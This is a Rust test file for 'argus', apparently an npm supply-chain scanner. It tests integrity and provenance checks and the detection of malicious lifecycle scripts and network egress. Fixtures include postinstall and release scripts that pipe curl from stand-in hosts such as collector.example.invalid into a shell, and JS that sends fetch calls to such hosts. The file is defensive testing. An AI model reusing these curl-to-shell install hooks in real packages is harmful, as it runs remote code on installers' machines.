//! End-to-end test for `fetch_and_scan` using a mock transport. No network.
//!
//! Builds a tiny tarball in memory, computes its real SHA-512 + base64
//! integrity string, synthesises a packument JSON pointing at it, and runs
//! the full fetch pipeline against a `MockTransport` that hands back the
//! right bytes for the right URLs.

use argus_core::{Decision, ScanReport, Severity};
use argus_fetch::{fetch_and_scan, fetch_and_scan_with_rules, FetchOptions, PackageRef};
use argus_rules::RuleSession;
use argus_test_support::MockTransport;
use base64::engine::general_purpose::STANDARD;
use base64::Engine as _;
use flate2::write::GzEncoder;
use flate2::Compression;
use sha2::{Digest, Sha512};
use tar::Header;

fn make_targz(entries: &[(&str, &[u8])]) -> Vec<u8> {
    let mut gz = GzEncoder::new(Vec::new(), Compression::default());
    {
        let mut builder = tar::Builder::new(&mut gz);
        for (path, body) in entries {
            let mut header = Header::new_gnu();
            header.set_path(path).unwrap();
            header.set_size(body.len() as u64);
            header.set_mode(0o644);
            header.set_entry_type(tar::EntryType::Regular);
            header.set_cksum();
            builder.append(&header, *body).unwrap();
        }
        builder.finish().unwrap();
    }
    gz.finish().unwrap()
}

fn fetch_syntax_fixture(
    package_json: &[u8],
    sources: &[(&str, &[u8])],
) -> anyhow::Result<ScanReport> {
    let rules = RuleSession::builtin()?;
    fetch_syntax_fixture_with_rules(package_json, sources, &rules)
}

fn fetch_syntax_fixture_with_rules(
    package_json: &[u8],
    sources: &[(&str, &[u8])],
    rules: &RuleSession,
) -> anyhow::Result<ScanReport> {
    let cache = tempfile::tempdir()?;
    let registry = "https://mock.registry";
    let mut source_paths = Vec::with_capacity(sources.len());
    for (path, _) in sources {
        source_paths.push(format!("package/{path}"));
    }
    let mut entries = vec![("package/package.json", package_json)];
    entries.extend(
        source_paths
            .iter()
            .zip(sources)
            .map(|(path, (_, body))| (path.as_str(), *body)),
    );
    let tarball = make_targz(&entries);
    let integrity = format!("sha512-{}", STANDARD.encode(Sha512::digest(&tarball)));
    let tarball_url = format!("{registry}/syntax-demo/-/syntax-demo-1.0.0.tgz");
    let packument = format!(
        r#"{{
          "name": "syntax-demo",
          "dist-tags": {{"latest": "1.0.0"}},
          "versions": {{
            "1.0.0": {{"dist": {{"tarball": "{tarball_url}", "integrity": "{integrity}"}}}}
          }}
        }}"#
    );
    let transport = MockTransport::new();
    transport.insert(&format!("{registry}/syntax-demo"), packument.into_bytes());
    transport.insert(&tarball_url, tarball);
    let opts = FetchOptions {
        registry: registry.to_string(),
        cache_dir: Some(cache.path().to_path_buf()),
        ..FetchOptions::default()
    };
    fetch_and_scan_with_rules(&PackageRef::parse("syntax-demo")?, &opts, &transport, rules)
}

#[test]
fn fetch_and_scan_allow_path() {
    let cache = tempfile::tempdir().unwrap();
    let registry = "https://mock.registry";
    let tarball = make_targz(&[
        (
            "package/package.json",
            br#"{"name":"argus-demo","version":"1.0.0"}"#,
        ),
        ("package/index.js", b"module.exports = {};"),
    ]);
    let integrity = format!("sha512-{}", STANDARD.encode(Sha512::digest(&tarball)));
    let tarball_url = format!("{registry}/argus-demo/-/argus-demo-1.0.0.tgz");
    let packument = format!(
        r#"{{
          "name": "argus-demo",
          "dist-tags": {{"latest": "1.0.0"}},
          "versions": {{
            "1.0.0": {{"dist": {{"tarball": "{tarball_url}", "integrity": "{integrity}"}}}}
          }}
        }}"#
    );

    let transport = MockTransport::new();
    transport.insert(&format!("{registry}/argus-demo"), packument.into_bytes());
    transport.insert(&tarball_url, tarball);

    let opts = FetchOptions {
        registry: registry.to_string(),
        cache_dir: Some(cache.path().to_path_buf()),
        ..FetchOptions::default()
    };
    let pkg = PackageRef::parse("argus-demo").unwrap();

    let report = fetch_and_scan(&pkg, &opts, &transport).unwrap();
    assert_eq!(report.decision, Decision::Allow);
    // Packument has no `dist.attestations` → expect `missing-provenance`
    // (info-level, does not block) and nothing else.
    let rule_ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert_eq!(rule_ids, vec!["missing-provenance"], "got: {rule_ids:?}");
    assert_eq!(report.package_name.as_deref(), Some("argus-demo"));
}

#[test]
fn npm_registry_metadata_name_mismatch_fails_closed() {
    let registry = "https://mock.registry";
    let packument = r#"{
      "name": "other-package",
      "dist-tags": {"latest": "1.0.0"},
      "versions": {
        "1.0.0": {
          "dist": {
            "tarball": "https://mock.registry/other-package/-/other-package-1.0.0.tgz",
            "integrity": "sha512-AAAA"
          }
        }
      }
    }"#;
    let transport = MockTransport::new();
    transport.insert(
        &format!("{registry}/argus-demo"),
        packument.as_bytes().to_vec(),
    );
    let opts = FetchOptions {
        registry: registry.to_string(),
        ..FetchOptions::default()
    };
    let pkg = PackageRef::parse("argus-demo").unwrap();

    let error = fetch_and_scan(&pkg, &opts, &transport)
        .unwrap_err()
        .to_string();
    assert!(
        error.contains("registry package identity mismatch"),
        "got: {error}"
    );
}

#[test]
fn fetch_rejects_tampered_tarball() {
    let cache = tempfile::tempdir().unwrap();
    let registry = "https://mock.registry";
    let tarball = make_targz(&[(
        "package/package.json",
        br#"{"name":"argus-demo","version":"1.0.0"}"#,
    )]);
    let integrity = format!("sha512-{}", STANDARD.encode(Sha512::digest(&tarball)));
    let mut tampered = tarball.clone();
    *tampered.last_mut().unwrap() ^= 0x01;

    let tarball_url = format!("{registry}/argus-demo/-/argus-demo-1.0.0.tgz");
    let packument = format!(
        r#"{{
          "name": "argus-demo",
          "dist-tags": {{"latest": "1.0.0"}},
          "versions": {{
            "1.0.0": {{"dist": {{"tarball": "{tarball_url}", "integrity": "{integrity}"}}}}
          }}
        }}"#
    );

    let transport = MockTransport::new();
    transport.insert(&format!("{registry}/argus-demo"), packument.into_bytes());
    transport.insert(&tarball_url, tampered);

    let opts = FetchOptions {
        registry: registry.to_string(),
        cache_dir: Some(cache.path().to_path_buf()),
        ..FetchOptions::default()
    };
    let pkg = PackageRef::parse("argus-demo").unwrap();
    let err = fetch_and_scan(&pkg, &opts, &transport)
        .unwrap_err()
        .to_string();
    assert!(err.contains("integrity"), "got: {err}");
}

#[test]
fn fetch_resolves_dist_tag() {
    let cache = tempfile::tempdir().unwrap();
    let registry = "https://mock.registry";
    let tarball = make_targz(&[(
        "package/package.json",
        br#"{"name":"argus-demo","version":"2.0.0-beta.1"}"#,
    )]);
    let integrity = format!("sha512-{}", STANDARD.encode(Sha512::digest(&tarball)));
    let tarball_url = format!("{registry}/argus-demo/-/argus-demo-2.0.0-beta.1.tgz");
    let packument = format!(
        r#"{{
          "name": "argus-demo",
          "dist-tags": {{"latest": "1.0.0", "beta": "2.0.0-beta.1"}},
          "versions": {{
            "1.0.0":         {{"dist": {{"tarball": "ignored", "integrity": "sha512-aaaa"}}}},
            "2.0.0-beta.1":  {{"dist": {{"tarball": "{tarball_url}", "integrity": "{integrity}"}}}}
          }}
        }}"#
    );

    let transport = MockTransport::new();
    transport.insert(&format!("{registry}/argus-demo"), packument.into_bytes());
    transport.insert(&tarball_url, tarball);

    let opts = FetchOptions {
        registry: registry.to_string(),
        cache_dir: Some(cache.path().to_path_buf()),
        ..FetchOptions::default()
    };
    let pkg = PackageRef::parse("argus-demo@beta").unwrap();
    let report = fetch_and_scan(&pkg, &opts, &transport).unwrap();
    assert_eq!(report.decision, Decision::Allow);
}

#[test]
fn fetch_rejects_cross_host_tarball() {
    // A tampered packument tells us the tarball lives on a different host
    // than the registry we contacted. argus must refuse rather than blindly
    // downloading from the attacker-supplied URL.
    let cache = tempfile::tempdir().unwrap();
    let registry = "https://mock.registry";
    let evil_url = "https://evil.example.invalid/argus-demo-1.0.0.tgz";
    let packument = format!(
        r#"{{
          "name": "argus-demo",
          "dist-tags": {{"latest": "1.0.0"}},
          "versions": {{
            "1.0.0": {{"dist": {{"tarball": "{evil_url}", "integrity": "sha512-AAAA"}}}}
          }}
        }}"#
    );
    let transport = MockTransport::new();
    transport.insert(&format!("{registry}/argus-demo"), packument.into_bytes());
    // The tarball URL is never registered — if validation is skipped, the
    // MockTransport's "no route" error would be the failure mode. With
    // validation, we should bail before any tarball GET happens.

    let opts = FetchOptions {
        registry: registry.to_string(),
        cache_dir: Some(cache.path().to_path_buf()),
        ..FetchOptions::default()
    };
    let pkg = PackageRef::parse("argus-demo").unwrap();
    let err = fetch_and_scan(&pkg, &opts, &transport)
        .unwrap_err()
        .to_string();
    assert!(
        err.contains("does not match registry host") || err.contains("evil.example.invalid"),
        "expected cross-host rejection, got: {err}"
    );
}

#[test]
fn fetch_rejects_http_tarball() {
    let cache = tempfile::tempdir().unwrap();
    let registry = "https://mock.registry";
    let http_url = "http://mock.registry/argus-demo-1.0.0.tgz";
    let packument = format!(
        r#"{{
          "name": "argus-demo",
          "dist-tags": {{"latest": "1.0.0"}},
          "versions": {{
            "1.0.0": {{"dist": {{"tarball": "{http_url}", "integrity": "sha512-AAAA"}}}}
          }}
        }}"#
    );
    let transport = MockTransport::new();
    transport.insert(&format!("{registry}/argus-demo"), packument.into_bytes());

    let opts = FetchOptions {
        registry: registry.to_string(),
        cache_dir: Some(cache.path().to_path_buf()),
        ..FetchOptions::default()
    };
    let pkg = PackageRef::parse("argus-demo").unwrap();
    let err = fetch_and_scan(&pkg, &opts, &transport)
        .unwrap_err()
        .to_string();
    assert!(
        err.contains("non-HTTPS") || err.contains("http://"),
        "expected http rejection, got: {err}"
    );
}

// ---------- provenance integration tests (#10) ----------

/// Build an attestations JSON document whose subject sha512 matches `sha512_hex`.
fn fake_attestations_json(subject_name: &str, sha512_hex: &str) -> Vec<u8> {
    use base64::Engine as _;
    let stmt = serde_json::json!({
        "_type": "https://in-toto.io/Statement/v0.1",
        "predicateType": "https://slsa.dev/provenance/v1",
        "subject": [{ "name": subject_name, "digest": { "sha512": sha512_hex } }],
        "predicate": {
            "buildDefinition": { "buildType": "https://github.com/actions/runner/v1" }
        }
    });
    let payload_b64 =
        base64::engine::general_purpose::STANDARD.encode(serde_json::to_vec(&stmt).unwrap());
    serde_json::json!({
        "attestations": [{
            "predicateType": "https://slsa.dev/provenance/v1",
            "bundle": {
                "mediaType": "application/vnd.dev.sigstore.bundle+json;version=0.2",
                "dsseEnvelope": { "payload": payload_b64 }
            }
        }]
    })
    .to_string()
    .into_bytes()
}

fn malformed_statement_attestations_json() -> Vec<u8> {
    let payload_b64 = STANDARD.encode(br#"{"not":"a statement"}"#);
    serde_json::json!({
        "attestations": [{
            "predicateType": "https://slsa.dev/provenance/v1",
            "bundle": {
                "mediaType": "application/vnd.dev.sigstore.bundle+json;version=0.2",
                "dsseEnvelope": { "payload": payload_b64 }
            }
        }]
    })
    .to_string()
    .into_bytes()
}

fn sha512_hex(bytes: &[u8]) -> String {
    let d = Sha512::digest(bytes);
    let mut s = String::with_capacity(d.len() * 2);
    for b in d {
        use std::fmt::Write as _;
        let _ = write!(s, "{b:02x}");
    }
    s
}

#[test]
fn fetch_provenance_subject_matches_records_info_finding() {
    let cache = tempfile::tempdir().unwrap();
    let registry = "https://mock.registry";
    let tarball = make_targz(&[(
        "package/package.json",
        br#"{"name":"argus-demo","version":"1.0.0"}"#,
    )]);
    let integrity = format!("sha512-{}", STANDARD.encode(Sha512::digest(&tarball)));
    let tarball_hex = sha512_hex(&tarball);
    let tarball_url = format!("{registry}/argus-demo/-/argus-demo-1.0.0.tgz");
    let attestations_url = format!("{registry}/-/npm/v1/attestations/argus-demo@1.0.0");
    let packument = format!(
        r#"{{
          "name": "argus-demo",
          "dist-tags": {{"latest": "1.0.0"}},
          "versions": {{
            "1.0.0": {{"dist": {{
              "tarball": "{tarball_url}",
              "integrity": "{integrity}",
              "attestations": {{"url": "{attestations_url}"}}
            }}}}
          }}
        }}"#
    );
    let attestations = fake_attestations_json("pkg:npm/argus-demo@1.0.0", &tarball_hex);

    let transport = MockTransport::new();
    transport.insert(&format!("{registry}/argus-demo"), packument.into_bytes());
    transport.insert(&tarball_url, tarball);
    transport.insert(&attestations_url, attestations);

    let opts = FetchOptions {
        registry: registry.to_string(),
        cache_dir: Some(cache.path().to_path_buf()),
        ..FetchOptions::default()
    };
    let pkg = PackageRef::parse("argus-demo").unwrap();
    let report = fetch_and_scan(&pkg, &opts, &transport).unwrap();
    assert_eq!(report.decision, Decision::Allow);
    let rule_ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert_eq!(rule_ids, vec!["provenance-verified-subject"]);
    // Detail should mention the builder we encoded.
    assert!(
        report.findings[0]
            .detail
            .contains("github.com/actions/runner"),
        "detail: {}",
        report.findings[0].detail
    );
}

#[test]
fn fetch_provenance_subject_mismatch_blocks() {
    let cache = tempfile::tempdir().unwrap();
    let registry = "https://mock.registry";
    let tarball = make_targz(&[(
        "package/package.json",
        br#"{"name":"argus-demo","version":"1.0.0"}"#,
    )]);
    let integrity = format!("sha512-{}", STANDARD.encode(Sha512::digest(&tarball)));
    let tarball_url = format!("{registry}/argus-demo/-/argus-demo-1.0.0.tgz");
    let attestations_url = format!("{registry}/-/npm/v1/attestations/argus-demo@1.0.0");
    let packument = format!(
        r#"{{
          "name": "argus-demo",
          "dist-tags": {{"latest": "1.0.0"}},
          "versions": {{
            "1.0.0": {{"dist": {{
              "tarball": "{tarball_url}",
              "integrity": "{integrity}",
              "attestations": {{"url": "{attestations_url}"}}
            }}}}
          }}
        }}"#
    );
    // Attestation claims a wrong digest — packument or attestations have
    // been tampered with.
    let fake_digest = "0".repeat(128);
    let attestations = fake_attestations_json("pkg:npm/argus-demo@1.0.0", &fake_digest);

    let transport = MockTransport::new();
    transport.insert(&format!("{registry}/argus-demo"), packument.into_bytes());
    transport.insert(&tarball_url, tarball);
    transport.insert(&attestations_url, attestations);

    let opts = FetchOptions {
        registry: registry.to_string(),
        cache_dir: Some(cache.path().to_path_buf()),
        ..FetchOptions::default()
    };
    let pkg = PackageRef::parse("argus-demo").unwrap();
    let report = fetch_and_scan(&pkg, &opts, &transport).unwrap();
    assert_eq!(report.decision, Decision::Block);
    let rule_ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(
        rule_ids.contains(&"provenance-subject-mismatch"),
        "got: {rule_ids:?}"
    );
}

#[test]
fn fetch_provenance_malformed_payload_records_parse_failed() -> anyhow::Result<()> {
    let cache = tempfile::tempdir()?;
    let registry = "https://mock.registry";
    let tarball = make_targz(&[(
        "package/package.json",
        br#"{"name":"argus-demo","version":"1.0.0"}"#,
    )]);
    let integrity = format!("sha512-{}", STANDARD.encode(Sha512::digest(&tarball)));
    let tarball_url = format!("{registry}/argus-demo/-/argus-demo-1.0.0.tgz");
    let attestations_url = format!("{registry}/-/npm/v1/attestations/argus-demo@1.0.0");
    let packument = format!(
        r#"{{
          "name": "argus-demo",
          "dist-tags": {{"latest": "1.0.0"}},
          "versions": {{
            "1.0.0": {{"dist": {{
              "tarball": "{tarball_url}",
              "integrity": "{integrity}",
              "attestations": {{"url": "{attestations_url}"}}
            }}}}
          }}
        }}"#
    );

    let transport = MockTransport::new();
    transport.insert(&format!("{registry}/argus-demo"), packument.into_bytes());
    transport.insert(&tarball_url, tarball);
    transport.insert(&attestations_url, malformed_statement_attestations_json());

    let opts = FetchOptions {
        registry: registry.to_string(),
        cache_dir: Some(cache.path().to_path_buf()),
        ..FetchOptions::default()
    };
    let pkg = PackageRef::parse("argus-demo")?;
    let report = fetch_and_scan(&pkg, &opts, &transport)?;
    let rule_ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();

    assert_eq!(report.decision, Decision::Block);
    assert!(
        rule_ids.contains(&"provenance-parse-failed"),
        "got: {rule_ids:?}"
    );
    assert!(
        !rule_ids.contains(&"provenance-no-sha512-subject"),
        "got: {rule_ids:?}"
    );
    Ok(())
}

#[test]
fn npm_lifecycle_ast_resolves_aliases_and_constants_once() -> anyhow::Result<()> {
    let report = fetch_syntax_fixture(
        br#"{
          "name":"syntax-demo",
          "version":"1.0.0",
          "scripts":{
            "postinstall":"BASE=https://collector.example.invalid; alias send=curl; send \"$BASE/payload\" | sh",
            "prepare":"bash -c 'curl https://second.example.invalid/payload | bash'"
          }
        }"#,
        &[],
    )?;
    for rule_id in ["remote-download", "shell-pipe-execution"] {
        let matches = report
            .findings
            .iter()
            .filter(|finding| finding.rule_id == rule_id)
            .collect::<Vec<_>>();
        assert_eq!(matches.len(), 1, "{rule_id}: {:?}", report.findings);
        assert_eq!(matches[0].location.as_deref(), Some("package.json:scripts"));
    }
    assert_eq!(report.decision, Decision::Block);
    Ok(())
}

#[test]
fn npm_lifecycle_ast_ignores_inert_remote_shell_text() -> anyhow::Result<()> {
    let report = fetch_syntax_fixture(
        br#"{
          "name":"syntax-demo",
          "version":"1.0.0",
          "scripts":{"postinstall":"printf '%s\n' 'curl https://collector.example.invalid/payload | sh' # inert example"}
        }"#,
        &[],
    )?;
    assert!(
        report.findings.iter().all(|finding| !matches!(
            finding.rule_id.as_str(),
            "remote-download" | "shell-pipe-execution"
        )),
        "got: {:?}",
        report.findings
    );
    Ok(())
}

#[test]
fn npm_custom_script_keeps_remote_shell_detection() -> anyhow::Result<()> {
    let report = fetch_syntax_fixture(
        br#"{
          "name":"syntax-demo",
          "version":"1.0.0",
          "scripts":{"release":"curl https://collector.example.invalid/payload | sh"}
        }"#,
        &[],
    )?;
    let rule_ids = report
        .findings
        .iter()
        .map(|finding| finding.rule_id.as_str())
        .collect::<Vec<_>>();
    assert!(rule_ids.contains(&"remote-download"), "got: {rule_ids:?}");
    assert!(
        rule_ids.contains(&"shell-pipe-execution"),
        "got: {rule_ids:?}"
    );
    Ok(())
}

#[test]
fn npm_source_ast_covers_all_js_ts_extensions_and_deduplicates() -> anyhow::Result<()> {
    let source = br#"
const base = "https://collector.example.invalid";
const send = globalThis.fetch;
send(base + "/first");
send(base + "/second");
"#;
    let files = [
        ("src/a.js", source.as_slice()),
        ("src/b.mjs", source.as_slice()),
        ("src/c.cjs", source.as_slice()),
        ("src/d.ts", source.as_slice()),
        ("src/e.mts", source.as_slice()),
        ("src/f.cts", source.as_slice()),
    ];
    let report = fetch_syntax_fixture(br#"{"name":"syntax-demo","version":"1.0.0"}"#, &files)?;
    let findings = report
        .findings
        .iter()
        .filter(|finding| finding.rule_id == "network-exfiltration")
        .collect::<Vec<_>>();
    assert_eq!(findings.len(), files.len(), "got: {:?}", report.findings);
    let locations = findings
        .iter()
        .map(|finding| finding.location.as_deref().expect("source location"))
        .collect::<std::collections::BTreeSet<_>>();
    assert_eq!(locations.len(), files.len(), "got: {locations:?}");
    assert!(findings.iter().all(|finding| {
        finding.capability.as_deref() == Some("net_egress")
            && finding
                .evidence
                .as_ref()
                .is_some_and(|evidence| !evidence.is_empty())
            && finding.resolved_host.as_deref() == Some("collector.example.invalid")
    }));
    assert_eq!(report.decision, Decision::Block);
    Ok(())
}

#[test]
fn npm_source_ast_ignores_comments_and_strings() -> anyhow::Result<()> {
    let inert = br#"
// fetch("https://collector.example.invalid/comment");
const docs = `axios.post("https://collector.example.invalid/string")`;
"#;
    let report = fetch_syntax_fixture(
        br#"{"name":"syntax-demo","version":"1.0.0"}"#,
        &[
            ("src/inert.js", inert),
            ("src/inert.ts", inert),
            ("README.txt", inert),
        ],
    )?;
    assert!(
        report
            .findings
            .iter()
            .all(|finding| finding.rule_id != "network-exfiltration"),
        "got: {:?}",
        report.findings
    );
    Ok(())
}

#[test]
fn npm_source_ast_preserves_host_exclusions_and_dynamic_values() -> anyhow::Result<()> {
    let report = fetch_syntax_fixture(
        br#"{"name":"syntax-demo","version":"1.0.0"}"#,
        &[(
            "src/safe.js",
            br#"
fetch("http://localhost/status");
fetch("http://127.0.0.1/status");
fetch("http://[::1]/status");
fetch("https://api.github.com/repos/example/demo");
fetch(runtime_url);
"#,
        )],
    )?;
    assert!(
        report
            .findings
            .iter()
            .all(|finding| finding.rule_id != "network-exfiltration"),
        "got: {:?}",
        report.findings
    );
    Ok(())
}

#[test]
fn npm_malformed_supported_source_fails_closed() {
    let error = fetch_syntax_fixture(
        br#"{"name":"syntax-demo","version":"1.0.0"}"#,
        &[("src/broken.ts", b"const broken = ;")],
    )
    .unwrap_err();
    assert!(
        format!("{error:#}").contains("refusing incomplete analysis"),
        "got: {error:#}"
    );
}

#[test]
fn npm_malformed_lifecycle_script_fails_closed() {
    let error = fetch_syntax_fixture(
        br#"{
          "name":"syntax-demo",
          "version":"1.0.0",
          "scripts":{"postinstall":"if true; then curl https://collector.example.invalid"}
        }"#,
        &[],
    )
    .unwrap_err();
    assert!(
        format!("{error:#}").contains("refusing incomplete analysis"),
        "got: {error:#}"
    );
}

const EXTERNAL_RULE_ID: &str = "npm-external-marker";

fn external_rule_session(off: bool) -> RuleSession {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("rules.yaml"),
        format!(
            "schema_version: 1\nrules:\n  - {{ id: \"{EXTERNAL_RULE_ID}\", description: \"external test rule\", policy_class: blocking, default_severity: high, help_uri: \"https://example.test/external-rule\", languages: [text], matcher: {{ kind: literal, pattern: \"ARGUS_EXTERNAL_RULE_MARKER\" }} }}\n"
        ),
    )
    .unwrap();
    let overrides = off
        .then(|| format!("{EXTERNAL_RULE_ID}=off"))
        .into_iter()
        .collect::<Vec<_>>();
    RuleSession::load(Some(dir.path()), &overrides).unwrap()
}

#[test]
fn npm_external_rule_matches_and_can_be_disabled() {
    let enabled = external_rule_session(false);
    let report = fetch_syntax_fixture_with_rules(
        br#"{"name":"syntax-demo","version":"1.0.0"}"#,
        &[("marker.txt", b"ARGUS_EXTERNAL_RULE_MARKER")],
        &enabled,
    )
    .unwrap();
    let finding = report
        .findings
        .iter()
        .find(|f| f.rule_id == EXTERNAL_RULE_ID)
        .unwrap();
    assert_eq!(
        (finding.severity, finding.location.as_deref()),
        (Severity::High, Some("marker.txt"))
    );
    assert_eq!(finding.evidence, Some(vec!["marker.txt:1".to_string()]));
    assert_eq!(report.decision, Decision::Block);
    assert_eq!(report.rules.as_ref(), enabled.metadata());
    let metadata = report.rules.as_ref().unwrap();
    assert_eq!(metadata.loaded_external_files, vec!["rules.yaml"]);
    assert_eq!(metadata.external_rule_count, 1);
    assert_eq!(metadata.disabled_rule_ids, Vec::<String>::new());
    assert_eq!(metadata.applied_overrides, Vec::<String>::new());
    assert_eq!(metadata.external_rules.len(), 1);
    let external_rule = &metadata.external_rules[0];
    assert_eq!(
        (
            external_rule.id.as_str(),
            external_rule.description.as_str(),
            external_rule.help_uri.as_str(),
            external_rule.severity,
        ),
        (
            EXTERNAL_RULE_ID,
            "external test rule",
            "https://example.test/external-rule",
            Severity::High,
        )
    );

    let disabled = external_rule_session(true);
    let report = fetch_syntax_fixture_with_rules(
        br#"{"name":"syntax-demo","version":"1.0.0"}"#,
        &[("marker.txt", b"ARGUS_EXTERNAL_RULE_MARKER")],
        &disabled,
    )
    .unwrap();
    assert!(!report
        .findings
        .iter()
        .any(|f| f.rule_id == EXTERNAL_RULE_ID));
    assert_eq!(report.decision, Decision::Allow);
    assert_eq!(report.rules.as_ref(), disabled.metadata());
    let metadata = report.rules.unwrap();
    assert_eq!(metadata.disabled_rule_ids, vec![EXTERNAL_RULE_ID]);
    assert_eq!(
        metadata.applied_overrides,
        vec![format!("{EXTERNAL_RULE_ID}=off")]
    );
}
